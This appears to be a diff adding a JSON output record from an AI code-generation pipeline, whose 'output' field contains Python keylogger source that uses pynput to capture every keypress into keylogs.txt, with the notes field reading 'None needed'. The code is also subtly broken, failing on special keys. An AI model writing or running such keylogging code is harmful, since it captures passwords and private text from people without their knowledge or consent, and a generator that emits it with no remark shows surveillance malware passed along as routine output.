@@ -1,0 +1,6 @@
+{
+  "output": "import pynput\n\ndef on_press(key):\n    with open('keylogs.txt', 'a') as f:\n        if key == pynput.keyboard.Key.enter:\n            f.write('\n')\n        else:\n            f.write(key.char)\n\nwith pynput.keyboard.Listener(on_press=on_press) as listener:\n    listener.join()",
+  "notes": "None needed",
+  "applied_fixes": [],
+  "iterations": 1
+}
